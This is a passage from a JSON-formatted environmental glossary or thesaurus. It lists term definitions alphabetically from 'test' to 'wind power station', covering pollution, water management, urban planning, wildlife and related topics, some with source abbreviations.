teacher or professor), aiming to gauge how much students have learnt over a given academic module, term or year.\", \"To test or examine for the presence of disease or infection.\", \"to check a property or quality of\"], \"test animal\": [\"An animal on which experiments are conducted in order to provide evidence for or against a scientific hypothesis, or to prove the efficacy of drugs or the reaction to certain products.\\\\n(Source: CEDa)\"], \"test organism\": [\"Any animal organism used for scientific research.\"], \"textile industry\": [\"Industry for the production of fabrics.\\\\n(Source: MGHa)\"], \"textile\": [\"A material made of natural or man-made fibers and used for the manufacture of items such as clothing and furniture fittings.\"], \"thallium\": [\"Bluish-white metal with tinlike malleability, but a little softer; used in alloys.\"], \"theory of money\": [\"A coherent group of general propositions about the supply and demand of money, interest rates, the flow of money's influence on the overall economy or the policies that should be adopted by institutions controlling the money supply.\"], \"theory of the welfare state\": [\"A political conception of government in a capitalist economy where the state is responsible for insuring that all members of society attain a minimum standard of living through redistribution of resources, progressive taxation and universal social programs, including health care and education.\"], \"therapy\": [\"The treatment of physical, mental or social disorders or disease.\"], \"thermal insulation\": [\"The process of preventing the passage of heat to or from a body by surrounding it with a nonconducting material.\"], \"thermal pollution\": [\"The excessive raising or lowering of water temperature above or below normal seasonal ranges in streams, lakes, or estuaries or oceans as the result of discharge of hot or cold effluents into such water.\\\\n(Source: LANDY /  WPR)\"], \"thermal power plant\": [\"A power-generating plant which uses heat to produce energy. Such plants may burn fossil fuels or use nuclear energy to produce the necessary thermal energy.\"], \"thermal water\": [\"Water, generally of a spring or geyser, whose temperature is appreciably above the local mean annual air temperature.\"], \"thermodynamics\": [\"The branch of physics which seeks to derive, from a few basic postulates, relationships between properties of matter, especially those connected with temperature, and a description of the conversion of energy from one form to another.\"], \"thermoselect process\": [\"A thermic waste processing technology.\"], \"thesaurus\": [\"A compilation of terms showing synonyms, related terms and other relationships and dependencies, often used in a book format or as a standardized, controlled vocabulary for an information storage and retrieval system.\"], \"tidal power\": [\"Mechanical power, which may be converted to electrical power, generated by the rise and fall of ocean tides.\"], \"tidal water\": [\"Any water whose level changes periodically due to tidal action.\"], \"tide\": [\"The periodic rise and fall of the water resulting from gravitational interaction between the sun, moon and earth.\"], \"time\": [\"The grammatical construct of the time in which a sentence acts.\", \"The dimension of the physical universe which, at a given place, orders the sequence of events.\", \"To measure the amount of time an object takes to complete a course (e.g., \\\"to clock a race car\\\").\", \"The period of time a prisoner is imprisoned.\", \"A designated instant in time.\", \"An instance or occurrence of an event.\"], \"tissue\": [\"A part of an organism consisting of a large number of cells having a similar structure and function.\", \"A sheet of paper that absorbs water, used for example to weep wet surfaces.\"], \"titanium\": [\"A strong malleable white metallic element with symbol Ti and atomic number 22, which is very corrosion-resistant and occurs in rutile and ilmenite. It is used in the manufacture of strong lightweight alloys, especially aircraft parts.\"], \"titanium dioxide\": [\"A white, water-insoluble powder that melts at 1560\\u00b0C, and which is produced commercially from the titanium dioxide minerals ilmenite and rutile; used in paints and cosmetics.\"], \"toad\": [\"Any anuran amphibian of the family Bufonidae, such as Bufo bufo of Europe. They are similar to frogs but are more terrestrial, having a drier warty skin.\"], \"tobacco\": [\"A genus of short-leafed plants (Nicotiana spp., L.) of the nightshade family indigenous to North and South America.\", \"Leaves of certain varieties of the tobacco plant, cultivated and harvested to make cigarettes, cigars, snuff, for smoking in pipes or for chewing.\"], \"tobacco smoke\": [\"The grey, brown, or blackish mixture of gases and suspended carbon particles resulting from the combustion of tobacco. Tobacco smoke is inhaled and distributes toxins widely throughout the body and causes an enormous variety of illness among users and among non-smokers exposed to tobacco smoke.\"], \"tornado\": [\"A rapidly rotating column of air developed around a very intense low-pressure centre.\"], \"tortoise\": [\"Any herbivorous terrestrial chelonian reptile of the family Testudinidae, of most warm regions, having a heavy dome-shaped shell and clawed limbs.\"], \"total parameter\": [\"The sum of parameters that must be taken into account when assessing water quality (organoleptic factors, physico-chemical factors, toxic substances, microbiological parameters.\"], \"tourism\": [\"The temporary movement of people to destinations outside their normal places or work and residence, the activities undertaken during their stay in those destinations and the facilities created to cater for their needs.\"], \"touristic zone\": [\"Any section of a region which attracts travelers, often because of its scenery, objects of interest or recreational activities.\"], \"toxic effect\": [\"A result produced by the ingestion or contact of poisonous materials.\"], \"toxicity\": [\"The degree of danger posed by a substance to animal or plant life.\"], \"toxic metal\": [\"Metal (usually heavy metals) which interferes with the respiration, metabolism or growth of organisms.\"], \"toxicological testing\": [\"Test for the determination of the inherent toxicity of a chemical.\"], \"toxicology\": [\"A science that deals with poisons, their actions, their detection, and the treatment of the conditions they produce.\\\\n(Source: LANDY)\"], \"toxic waste\": [\"Refuse posing a significant hazard to the environment or to human health when improperly handled.\"], \"toxin\": [\"A substance that may present a risk or injury to health or the environment.\"], \"trace element\": [\"Any of various chemical elements that occur in very small amounts in organisms and are essential for many physiological and biochemical processes.\"], \"tracheophyte\": [\"A large group of plants characterized by the presence of specialized conducting tissues (xylem and phloem) in the roots, stems, and leaves.\\\\n(Source: MGH)\"], \"trade barrier\": [\"An artificial restraint on the free exchange of goods and services between nations.\"], \"trade policy\": [\"A course of action adopted and pursued by government, business or some other organization, which promotes or determines the direction for the act or process of buying, selling or exchanging goods and services within a country or between countries.\"], \"trade restriction\": [\"Commercial discrimination that apply to the exports of certain countries but not to similar goods from other countries.\"], \"traditional health care\": [\"A system of treating and healing maladies based on cultural beliefs and practices handed down from generation to generation.\\\\n(Source: FIT)\"], \"traffic\": [\"The movement of vehicles, ships, aircraft, persons, etc., in an area or over a route.\", \"The vehicles, persons, etc., moving in an area or over a route.\", \"The buying and selling, especially of illicit trade.\", \"To buy and sell goods illegally.\", \"To exchange goods.\"], \"traffic accident\": [\"An unexpected incident with potential for harm occurring through the movement or collision of vessels, vehicles or persons along a land, water, air or space route.\\\\n(Source: OED)\"], \"traffic control\": [\"The organization of a more efficient movement of traffic within a given road network by rearranging the flows, controlling the intersections and regulating the times and places for parking.\"], \"traffic engineering\": [\"The determination of the required capacity and layout of highway and street facilities that can safely and economically serve vehicular movement between given points.\\\\n(Source: MGH)\"], \"traffic infrastructure\": [\"The fundamental facilities and systems used for the movement of vehicles, often provided through public funding.\"], \"traffic jam\": [\"A number of vehicles so obstructed that they can scarcely move.\"], \"traffic monitoring\": [\"The periodic or continuous surveillance or analysis of the movement of persons, objects, vehicles or other conveyances along an area of passage.\"], \"traffic noise\": [\"Noise emitted by vehicles (heavy vehicles, cars and motorcycles, tyre/road interaction).\"], \"traffic on water\": [\"The movement of boats and other vessels over any water route or area.\"], \"train\": [\"A self-propelled, connected group of vehicles moving on rails.\", \"To point or cause to go (blows, weapons, or objects such as photographic equipment) towards\", \"To develop behaviour by instruction and practice.\", \"A group of animals, vehicles, or people that follow one another in a line.\", \"To do physical exercise to improve one's fitness.\", \"To exercise in order to prepare for an event or competition.\", \"To teach by training.\", \"To undergo training or instruction for a particular role, function, or profession.\", \"To educate for a future role or function.\", \"To act as a trainer or coach (to), as in sports.\"], \"training\": [\"The process of bringing a person or a group of persons to an agreed standard of proficiency and skilled behavior, by practice and instruction.\", \"The period in which someone who starts a profession is trained; the position of apprentice.\"], \"trajectory\": [\"The path described by an object moving in air or space under the influence of such forces as thrust, wind resistance, and gravity, especially the curved path of a projectile.\"], \"transition element\": [\"One of a group of metallic elements in which the members have the filling of the outermost shell to 8 electrons interrupted to bring the penultimate shell from 8 to 18 or 32 electrons; includes elements 21 through 29 (scandium through copper), 39 through 47 (yttrium through silver), 57 through 79 (lanthanum through gold), and 89 through 112 (actinium through ununbium) on.\"], \"transpiration\": [\"The loss of water vapour from a plant, mainly through the stomata and to a small extent through the cuticle and lenticels.\", \"The production and evaporation of a watery fluid called sweat that is excreted by the sweat glands in the skin of mammals.\"], \"transportation business\": [\"Any commercial venture involved in the processes of conveying things or people from one place to another.\"], \"transportation policy\": [\"Comprehensive statements of the objectives and policies which a local transport authority intends to pursue; it includes and estimate of transport expenditure, a statement of transport objectives, etc.\\\\n(Source: GOOD)\"], \"transportation\": [\"The act or means of moving tangible objects (persons or goods) from place to place. Often involves the use of some type of vehicle.\", \"The act of expelling a person from his native land.\"], \"trapping\": [\"The act of catching an animal in a mechanical device or enclosed place or pit.\"], \"travel\": [\"To move from one place to another generally by using a transportation mean; to undertake a trip.\", \"The transport of people on a trip or journey.\"], \"travel cost\": [\"Expenditure of money or the amount of money incurred for journeying or going from one place to another by some mode of transportation.\\\\n(Source: ISEP /  RHW)\"], \"treaty\": [\"An international agreement in writing between two states or a number of states. They are binding in international law; some create law only for those states that are parties to them.\"], \"tree\": [\"Any large woody perennial plant with a distinct trunk giving rise to branches or leaves at some distance from the ground.\", \"A widely-used data structure that emulates a tree structure with a set of linked nodes.\"], \"tree nursery\": [\"An area where trees, shrubs, or plants are grown for transplanting, for use as stocks for budding and grafting.\\\\n(Source: ECHO2)\"], \"trend\": [\"The general drift, tendency, or bent of a set of statistical data as related to time or another related set of statistical data.\\\\n(Source: MGH)\"], \"triazine\": [\"Azines that contain three nitrogen atoms in their molecules.\"], \"trinity of principles\": [\"Three fundamental principles of environmental policy: precautionary principle, polluter pays-principle and cooperation principle.\"], \"tritium\": [\"The hydrogen isotope having mass number 3; it is one form of heavy hydrogen, the other being deuterium.\"], \"trophic level\": [\"Any of the feeding levels through which the passage of energy through an ecosystem proceeds.\"], \"tropical forest ecosystem\": [\"The interacting system of a biological community and its non-living environmental surroundings in forests found in tropical regions near the equator, which are characterized by warm to hot weather and abundant rainfall.\"], \"tropical forest\": [\"A vegetation class consisting of tall, close-growing trees, their columnar trunks more or less unbranched in the lower two-thirds, and forming a spreading and frequently flat crown; occurs in areas of high temperature and high rainfall.\"], \"tropical rain forest\": [\"A type of forest that occurs roughly within the latitudes 28 degrees north or south of the equator and is characterized by high average temperatures and a significant amount of rainfall.\"], \"tropics\": [\"The region of the earth's surface lying between two parallels of latitude on the earth, one 23\\u00b027' north of the equator and the other 23\\u00b027' south of the equator, representing the points farthest north and south at which the sun can shine directly overhead and constituting the boundaries of the Torrid Zone.\\\\n(Source: AMHER)\"], \"troposphere\": [\"The lowest of the concentric layers of the atmosphere, occurring between the Earth's surface and the tropopause.\"], \"tropospheric ozone\": [\"Tropospheric ozone is a secondary pollutant formed from emissions of nitrogen oxides, non-methane volatile organic compounds and carbon monoxide. Ozone scars lung tissue, makes eyes sting and throats itch. It has been implicated as a contributor to forest dieback, damage to agricultural crops, etc.\\\\n(Source: WPR)\"], \"tundra\": [\"An area supporting some vegetation (lichens, mosses, sedges and low shrubs) between the northern upper limit of trees and the lower limit of perennial snow on mountains, and on the fringes of the Antarctic continent and its neighbouring islands.\"], \"tunnel\": [\"A underground passageway, especially one for trains or cars that passes under a mountain, river or a congested urban area.\", \"An Internet Protocol (IP) network communications channel between two networks. It is used to transport another network protocol by encapsulation and often encryption of its packets.\"], \"turbidity\": [\"Cloudy or hazy appearance in a naturally clear liquid caused by a suspension of colloidal liquid droplets or fine solids.\"], \"turbine\": [\"A fluid acceleration machine for generating rotary mechanical power from the energy in a stream of fluid.\\\\n(Source: MGH)\"], \"tween-deck tanker\": [\"A sea-going vessel that includes space between two continuous floor-like surfaces or platforms, which is also designed for bulk shipments of liquids or gases.\"], \"twin-hull craft\": [\"Oil tank vessels provided with a double-hull to meet the regulatory safety requirements in oil transportation.\"], \"two-stroke engine\": [\"An internal combustion engine whose cycle is completed in two strokes of the piston.\"], \"type of claim\": [\"A class or category of interests or remedies recognized in law or equity that create in the holder a right to the interest or its proceeds, typically taking the form of money, property or privilege.\\\\n(Source: BLD)\"], \"typhoon\": [\"A severe tropical cyclone in the western Pacific.\"], \"tyre\": [\"A rubber ring placed over the rim of a wheel of a road vehicle to provide traction and reduce road shocks.\"], \"ultrafiltration\": [\"Separation of colloidal or very fine solid materials by filtration through microporous or semipermeable mediums.\"], \"ultrasound\": [\"Sound waves having a frequency above about 20,000 hertz.\"], \"ultraviolet radiation\": [\"The part of the electromagnetic spectrum with wavelengths shorter than light but longer than x-rays; in the range of 4-400 nm.\\\\n(Source: CED)\"], \"underground train\": [\"A train for transportation of people, mostly beneath the surface of the ground, in order to lessen the traffic.\"], \"unemployment\": [\"The condition of being without remunerative employment.\"], \"ungulate\": [\"Animal with hooved feet.\", \"Having a hoof.\"], \"United Nations\": [\"A voluntary association of around 180 state signatory to the UN charter (1945), whose primary aim is to maintain international peace and security, solve economic, social, and political problems through international co-operation, and promote respect for human rights.\", \"Relating to the United Nations.\"], \"unleaded petrol\": [\"Petrol, which has no lead additives in it and therefore creates less lead pollution in the atmosphere.\"], \"clean air area\": [\"Area where significant reductions in ozone forming pollutants have been achieved.\"], \"raw water\": [\"Water that has not been treated.\"], \"upbringing\": [\"The way in which a child is cared for and taught while it is growing up.\"], \"Upper House\": [\"The body of a bicameral legislature comprising either representatives of member states in a federation or a select number of individuals from certain privileged estates or social classes.\"], \"uranium\": [\"A metallic element highly toxic and radioactive; used as nuclear fuel.\\\\nSymbol: U, atomic number: 92.\"], \"urban area\": [\"Areas within the legal boundaries of cities and towns; suburban areas developed for residential, industrial or recreational purposes.\", \"The area within a city or town, as indicated by appropriate traffic signs (or, in the United Kingdom, by the presence of street lights), where different traffic rules are in effect, such as a reduction of the speed limit.\"], \"urban decay\": [\"Condition where part of a city or town becomes old or dirty or ruined, because businesses and wealthy families have moved away from it.\"], \"urban design\": [\"A plan, outline or preliminary sketch of, or for, a city or town.\"], \"urban development\": [\"Any physical extension of, or changes to, the uses of land in metropolitan areas, often involving subdivision into zones; construction or modification of buildings, roads, utilities and other facilities; removal of trees and other obstructions; and population growth and related economic, social and political changes.\"], \"urban green\": [\"The complex of private and public gardens in an urban area.\\\\n(Source: DIFID)\"], \"urban landscape\": [\"The traits, patterns and structure of a city's specific geographic area, including its biological composition, its physical environment and its social patterns.\"], \"urban management\": [\"The administration, organization and planning performed for cities or towns, particularly the process of converting farmland or undeveloped land into offices, businesses, housing and other forms of development.\\\\n(Source: DOE)\"], \"urban planning\": [\"The activity of designing, organizing or preparing for the future lay-out and condition of a city or town.\", \"The study and theory of building and other physical needs in cities or predominantly urban cultures.\"], \"urban population\": [\"The total number of persons inhabiting a city, metropolitan region or any area where the sum of residents exceeds a designated amount.\"], \"urban renewal\": [\"A continuing process of remodelling urban areas by means of rehabilitation and conservation as well as redevelopment. Urban renewal programmes are generally undertaken by public authorities and concern those parts of the city which have fallen below current standards of public acceptability.\"], \"urban stress\": [\"A state of bodily or mental tension developed through city living, or the physical, chemical, or emotional factors that give rise to that tension.\"], \"urban study\": [\"The study and theory of building and other physical needs in cities or predominantly urban cultures.\"], \"urban traffic\": [\"Movements of vehicles and people within a city.\\\\n(Source: RRDA)\"], \"urban water supply\": [\"The distribution of water, including collection, treatment and storage, for use in a town, city or municipal area, and used generally for domestic and industrial needs.\"], \"valley\": [\"Any low-lying land bordered by higher ground; especially an elongate, relatively large, gently sloping depression of the Earth's surface, commonly situated between two mountains or between ranges of hills or mountains, and often containing a stream with an outlet.\"], \"vanadium\": [\"A silvery-white, ductile metal resistant to corrosion; used in alloy steels and as an x-ray target.\"], \"vandalism\": [\"The deliberate or wanton destruction of personal or public property caused by a vandal.\"], \"varnish\": [\"A transparent surface coating which is applied as a liquid and then changes to a hard solid.\"], \"vegetation cover\": [\"Number of plants growing on a certain area of land.\"], \"vegetable cultivation\": [\"Cultivation of herbaceous plants that are used as food.\"], \"plant ecology\": [\"Study of the relationships between plants and their environment.\\\\n(Source: LBC)\"], \"plant selection\": [\"The selection by man of particular genotypes in a plant population because they exhibit desired phenotypic characters.\\\\n(Source: LBC)\"], \"vegetable oil\": [\"An edible, mixed glyceride oil derived from plants (fruit, leaves, and seeds).\"], \"plant reproduction\": [\"Any of various processes, either sexual or asexual, by which a plant produces one or more individuals similar to itself.\"], \"vegetable\": [\"Any of various herbaceous plants having parts that are used as food.\", \"A person with severe brain damage or who is in a persistent vegetative state.\", \"An organism that is not an animal, especially an organism capable of photosynthesis.\"], \"vegetation\": [\"1) The plants of an area considered in general or as communities, but not taxonomically; the total plant cover in a particular area or on the Earth as a whole. 2) The total mass of plant life that occupies a given area.\\\\n(Source: ALL /  MGH)\", \"The plants that inhabit a certain region or environment.\"], \"vegetation type\": [\"A community of plants or plant life that share distinguishable characteristics.\\\\n(Source: PEM)\"], \"vehicle\": [\"Any conveyance in or by which people or objects are transported.\"], \"vehicle inspection\": [\"An official periodical examination of an automobile, truck, boat, airplane or other means of conveyance to determine compliance in design or operation with legal standards for safety or pollution emissions.\\\\n(Source: DAM / RHW)\"], \"ventilation\": [\"The process of supplying or removing air, by natural or mechanical means, to or from any space; such air may or may not have been conditioned.\"], \"vermin\": [\"Small animals and insects that can be harmful and which are difficult to control when they appear in large numbers.\\\\n(Source: CAMB)\"], \"vertebrate\": [\"Any chordate animal of the subphylum Vertebrata, characterized by a bony or cartilaginous skeleton and a well-developed brain: the group contains fishes, amphibians, reptiles, birds, and mammals.\\\\n(Source: CED)\"], \"veterinary medicine\": [\"The branch of medical practice which treats of the diseases and injuries of animals.\"], \"viaduct\": [\"A long high bridge, usually held up by many arches, which carries a railway or a road over a valley or other similar area at a lower level.\"], \"vibration\": [\"A periodic motion of small amplitude and high frequency, characteristic of elastic bodies.\"], \"video\": [\"A format or system used to record and transmit visual or audiovisual information by translating moving or still images into electrical signals.\\\\n(Source: MVG)\"], \"village\": [\"A group of houses and other buildings, such as a church, a school and some shops, which is smaller than a town, usually in the countryside.\", \"Small town or part of it.\"], \"vinasse\": [\"The residual liquid from the distillation of alcoholic liquors, specifically, that remaining from the fermentation and distillation of beet-sugar molasses, valuable as yielding potassium salts, ammonia, etc.\"], \"virology\": [\"The study of submicroscopic organisms known as viruses.\"], \"virus\": [\"Submicroscopic agents that infect plants, animals and bacteria, and are unable to reproduce outside the tissues of the host.\\\\n(Source: ALL)\", \"Computer program that is designed to damage a computer and that is able to spread itself to other computers.\"], \"viscosity\": [\"A measure of the resistance of a fluid.\"], \"vitamin\": [\"An organic compound present in variable, minute quantities in natural foodstuffs and essential for the normal processes of growth and maintenance of the body.\"], \"viticulture\": [\"Division of horticulture concerned with grape growing, studies of grape varieties, methods of culture, and insect and disease control.\"], \"vocabulary\": [\"A list of words or phrases of a language, technical field or some specialized area, usually arranged in alphabetical order and often provided with brief definitions and with foreign translations.\"], \"vocational training\": [\"A special training for a regular occupation or profession, especially, one for which one is specially suited or qualified.\"], \"volatile organic compound\": [\"Organic compound readily passing off by evaporation.\"], \"volatility\": [\"The property of a substance or substances to convert into vapor or gas without chemical change.\"], \"volcanic eruption\": [\"The ejection of solid, liquid, or gaseous material from a volcano.\"], \"volcanism\": [\"The processes by which magma and its associated gases rise into the crust and are extruded onto the Earth's surface and into the atmosphere.\\\\n(Source: BJGEO)\"], \"volcano\": [\"A vent in the surface of the Earth through which magma and associated gases and ash erupt.\", \"A mountain formed by volcanic material.\"], \"voluntary work\": [\"Unpaid activities done by citizens often organized in associations, to provide services to others, particularly to elderly and poor people, handicapped, etc.\"], \"Wadden Sea\": [\"A shallow sea extending along the North Sea coasts of The Netherlands, Germany and Denmark.\"], \"wage system\": [\"System which compensates the employees with a fixed sum per piece, hour, day or another period of time, covering all compensations including salary.\"], \"wall\": [\"A vertical construction made of stone, brick, wood, etc., with a length and height much greater than its thickness, used to enclose, divide or support.\", \"A type of small thin wall, made \\u200b\\u200bof wood or masonry and used for the division of an apartment or any building.\", \"A divisive or containing structure in an organ or cavity.\"], \"war\": [\"A conflict or a state of hostility between two or more parties, nations or states, in which armed forces or military operations are used.\"], \"warm-blooded animal\": [\"Animal which has a body temperature that stays the same and does not change with the temperature of its surroundings.\"], \"warning system\": [\"Any series of procedures and devices designed to detect sudden or potential threats to persons, property or the environment, often utilizing radar technology.\"], \"wastage\": [\"Extravagant or useless consumption or expenditures.\"], \"waste\": [\"Unwanted or undesired material, usually discarded.\", \"To use goods and wealth inconsiderately, without any care.\", \"Excessive spending of goods and wealth.\", \"To cause extensive destruction or ruin utterly.\"], \"waste balance\": [\"The inventory of all waste produced or recovered during a certain time period, classified by type and quantity.\\\\n(Source: DOG)\"], \"waste bin\": [\"A container for litter, rubbish, etc.\\\\n(Source: CED)\"], \"waste collection\": [\"The periodic or on-demand removal of solid waste from primary source locations using a collection vehicle and followed by the depositing of this waste at some central facility or disposal site.\"], \"waste degasification\": [\"The removal of gaseous components from waste.\"], \"waste exchange\": [\"Exchange of the recyclable part of wastes. This procedure allows to minimize waste volume and the cost relating to waste disposal. The basis of waste exchange is the concept that \\\"one company's waste is another company's raw material\\\".\\\\n(Source: ECOUK /  ECHO2)\"], \"waste gas\": [\"Any unusable aeriform fluid, or suspension of fine particles in air, given off by a manufacturing process or the burning of a substance in a enclosed area.\\\\n(Source: OED / RHW)\"], \"waste glass\": [\"Discarded material from the glass manufacturing process or from used consumer products made of glass.\"], \"waste gypsum\": [\"By-product of the wet limestone flue gas desulphurisation process.\\\\n(Source: PORTa)\"], \"waste heat\": [\"Heat derived from the cooling process of electric power generating plants and which can cause thermal pollution of watercourses, promoting algal bloom.\"], \"waste heat charge\": [\"The release of heat generated as a byproduct from industrial or power generation processes.\\\\n(Source: TOE)\"], \"waste oil\": [\"Oil that arises as a waste product of the use of oils in a wide range of industrial and commercial activities, such as engineering, power generation and vehicle maintenance and should be properly disposed of, or treated in order to be reused.\"], \"waste paper\": [\"Newspapers, magazines, cartons and other paper separated from solid waste for the purpose of recycling.\"], \"waste recycling\": [\"A method of recovering wastes as resources which includes the collection, and often involving the treatment, of waste products for use as a replacement of all or part of the raw material in a manufacturing process.\"], \"waste sorting\": [\"Separating waste into different materials, such as glass, metal, paper, plastic, etc.\\\\n(Source: PHC)\"], \"waste treatment\": [\"Any process or combination of processes that changes the chemical, physical or biological composition or character of any waste or reduces or removes its harmful properties or characteristics for any purpose.\"], \"waste water\": [\"Used water, or water that is not needed, which is permitted to escape, or unavoidably escapes from canals, ditches, reservoirs or other bodies of water, for which the owners of these structures are legally responsible.\"], \"waste water charge\": [\"Imposed fee, expense, or cost for the management of spent or used water that contains dissolved or suspended matter from a home, community farm, or industry.\\\\n(Source: TOE / RHW)\"], \"water bottom\": [\"The floor upon which any body of water rests.\\\\n(Source: BJGEO)\"], \"water collection\": [\"The catching of water, especially rain water, in a structure such as a basin or reservoir.\"], \"water conservation\": [\"The protection, development and efficient management of water resources for beneficial purposes.\"], \"water consumption\": [\"The utilization patterns and quantities entailed in a community or human group's use of water for survival, comfort and enjoyment.\"], \"watercourse\": [\"A natural stream arising in a given drainage basin but not wholly dependent for its flow on surface drainage in its immediate area, flowing in a channel with a well-defined bed between visible banks or through a definite depression in the land, having a definite and permanent or periodic supply of water, and usually, but not necessarily, having a perceptible current in a particular direction and discharging at a fixed point into another body of water.\\\\n(Source: BJGEO)\"], \"water distribution system\": [\"The system of pipes supplying water to communities and industries.\"], \"water erosion\": [\"The breakdown of solid rock into smaller particles and its removal by water.\"], \"waterfall\": [\"A perpendicular or steep descent of the water of a stream.\"], \"water flea\": [\"A fresh-water branchiopod crustacean of the genus Daphnia characterized by a transparent bivalve shell.\"], \"hydrologic flow\": [\"The characteristic behaviour and the total quantity of water involved in a drainage basin, determined by measuring such quantities as rainfall, surface and subsurface storage and flow, and evapotranspiration.\\\\n(Source: BJGEO)\"], \"water for consumption\": [\"Consumptive water use starts with withdrawal, but in this case without any return, e.g. irrigation, steam escaping into the atmosphere, water contained in final products, i.e. it is no longer available directly for subsequent use.\"], \"waterfowl\": [\"Aquatic birds which constitute the order Anseriformes, including the swans, ducks, geese, and screamers.\"], \"water hardness\": [\"The amount of calcium and magnesium salts dissolved in water.\"], \"water hyacinth\": [\"Floating aquatic plant, Eichhornia crassipes of tropical America, having showy bluish-purple flowers and swollen leafstalks: family Pontederiaceae. It forms dense masses in rivers, ponds, etc., and is a serious pest in the southern U.S., Java, Australia, New Zealand, and parts of Africa.\\\\n(Source: CED)\"], \"water level\": [\"The level reached by the surface of a body of water.\"], \"water pollutant\": [\"A chemical or physical agent introduced to any body of water that may detrimentally alter the natural condition of that body of water and other associated bodies of water.\"], \"water pollution\": [\"The manmade or man-induced alteration of the chemical, physical, biological and radiological integrity of water.\\\\n(Source: LANDY)\"], \"water pollution prevention\": [\"Precautionary measures, actions or installations implemented to avert or hinder human-made or human-induced alteration of the physical, biological, chemical and radiological integrity of water.\"], \"water protection\": [\"Measures to conserve surface and groundwater; to ensure the continued availability of water for growing domestic, commercial and industrial uses and to ensure sufficient water for natural ecosystems.\\\\n(Source: GILP96a)\"], \"water pump\": [\"A machine or apparatus used to lift water, usually from a well or borehole, which is powered manually or by engine, wind or some other source.\"], \"water purification\": [\"Any of several processes in which undesirable impurities in water are removed or neutralized.\"], \"water quality\": [\"A graded value of the components (organic and inorganic, chemical or physical) which comprise the nature of water.\"], \"water quality management\": [\"Water quality management concerns four major elements: the use (recreation, drinking water, fish and wildlife propagation, industrial or agricultural) to be made of the water; criteria to protect those uses; implementation plans (for needed industrial-municipal waste treatment improvements) and enforcement plans, and an anti-degradation statement to protect existing high quality waters.\\\\n(Source: USC)\"], \"water salination\": [\"Process by which water becomes more salty, found especially in hot countries where irrigation is practised.\"], \"water science\": [\"The science that treats the occurrence, circulation, distribution, and properties of the waters of the earth, and their reaction with the environment.\\\\n(Source: MGH)\"], \"watershed\": [\"The dividing line between two adjacent river systems, such as a ridge.\", \"An area of land where all rainwater and melting snow naturally moves to the same body of water.\"], \"water supply\": [\"A source or volume of water available for use; also, the system of reservoirs, wells, conduits, and treatment facilities required to make the water available and usable.\"], \"water transportation\": [\"Transportation of goods or persons by means of ships travelling on the sea or on inland waterways.\\\\n(Source: CEDa)\"], \"water treatment\": [\"Purification of water to make it suitable for drinking or for any other use.\"], \"waterway\": [\"A river, canal, or other navigable channel used as a means of travel or transport.\"], \"water well\": [\"A well sunk to extract water from a zone of saturation.\"], \"waterworks\": [\"Plant for treating and purifying water before it is pumped into pipes for distribution to houses, factories, schools, etc.\", \"The water supply system of a town etc., including reservoirs, pumps and pipes.\"], \"wave energy\": [\"Power extracted from the motion of sea waves at the coast.\"], \"sea wave\": [\"A moving ridge or swell of water occurring close to the surface of the sea, characterized by oscillating and rising and falling movements, often as a result of the frictional drag of the wind.\\\\n(Source: OED / INP)\"], \"weapon\": [\"An instrument of attack or defense in combat, as a gun, missile, or sword.\"], \"weather\": [\"The day-to-day meteorological conditions, especially temperature, cloudiness, and rainfall, affecting a specific place.\"], \"weather condition\": [\"The complex of meteorological characteristics in a given region.\\\\n\\\\n(Source: RRDA)\"], \"weather modification\": [\"The changing of natural weather phenomena by technical means.\"], \"weather monitoring\": [\"The periodic or continuous surveillance or analysis of the state of the atmosphere and climate, including variables such as temperature, moisture, wind velocity and barometric pressure.\\\\n(Source: TOE / RHW)\"], \"weather forecasting\": [\"The act or process of predicting and highlighting meteorological conditions that are expected for a specific time period and for a specific area or portion of air space, by using objective models based on certain atmospheric parameters, along with the skill and experience of a meteorologist.\\\\n(Source: FEM / AUS)\"], \"weed\": [\"Any plant that grows wild and profusely, especially one that grows among cultivated plants, depriving them of space, food, etc.\", \"A drug prepared from the cannabis plant, that is smoked or ingested for its euphoric effect.\", \"To pull out weeds by hand.\", \"To clear (a cultivated area) of weeds (unwanted vegetation).\"], \"weight\": [\"The gravitational force with which the earth attracts a body. By extension, the gravitational force with which a star, planet, or satellite attracts a nearby body.\"], \"welding\": [\"Joining two metals by applying heat to melt and fuse them, with or without filler metal.\"], \"well\": [\"A hole dug into the earth to reach a supply of water, oil, brine or gas.\", \"An interjection in response to a statement that is only partially agreed with by the speaker. It is often followed by a counterstatement by the speaker elaborating on the nature of the disagreement.\", \"To a great extent or degree.\"], \"West Africa\": [\"A geographic region of the African continent bordered in the west and south by the Atlantic Ocean, including the republics of Benin, Burkina Faso, Cape Verde, Ivory Coast, Gambia, Ghana, Guinea-Bissau, Liberia, Mali, Mauritania, Niger, Nigeria, Senegal, Sierra Leone and Togo.\\\\n(Source: ECW)\"], \"Western Asia\": [\"A geographic region of Asia that includes Turkey, Iran and other countries of the Middle East and the Arabian peninsula.\"], \"Western Europe\": [\"A geographic region of the European continent surrounded by the North Sea, Atlantic Ocean and the Mediterranean Sea, including Belgium, France, Germany, Great Britain, Greece, Italy, Luxembourg, Netherlands, Portugal, Spain and other member countries of the Western European Union.\"], \"wetland\": [\"Area that is inundated by surface or ground water with frequency sufficient to support a prevalence of vegetative or aquatic life that requires saturated or seasonally saturated soil conditions for growth or reproduction.\"], \"wet scrubber\": [\"An air cleaning device that literally washes out the dust. Exhaust air is forced into a spray chamber, where fine water particles cause the dust to drop from the air stream. The dust-ladden water is then treated to remove the solid material and is often recirculated.\", \"Equipment through which a gas is passed to remove impurities (solid, liquid, or gaseous particles) by intimate contact with a suitable liquid, usually an aqueous medium.\"], \"whale\": [\"Large marine mammals of the order Cetacea; the body is streamlined, the broad flat tail is used for propulsion, and the limbs are balancing structures.\"], \"whaling\": [\"Catching whales to use as food or for their oil, etc.\", \"Relating to whales.\"], \"wholesale trade\": [\"The business of selling goods to retailers in larger quantities than they are sold to final consumers but in smaller quantities than they are purchased from manufacturers.\"], \"wild animal\": [\"A non-domesticated animal living independently of man.\"], \"wildlife\": [\"All non-domesticated plants, animals and other organisms living in the wild.\"], \"wildlife sanctuary\": [\"An area designated for the protection of wild animals.\"], \"wild plant\": [\"A non-domesticated plant.\"], \"wind\": [\"The motion of air relative to the earth's surface; usually means horizontal air motion, as distinguished from vertical motion.\", \"To wrap something in loops around something else.\"], \"wind erosion\": [\"The breakdown of solid rock into smaller particles and its removal by wind.\"], \"windmill\": [\"A machine for grinding or pumping driven by a set of adjustable vanes or sails that are caused to turn by the force of the wind.\"], \"wind power\": [\"Energy extracted from wind, traditionally in a windmill, but increasingly by more complicated designes including turbines, usually to produce electricity but also for water pumping.\"], \"wind power station\": [\"Power 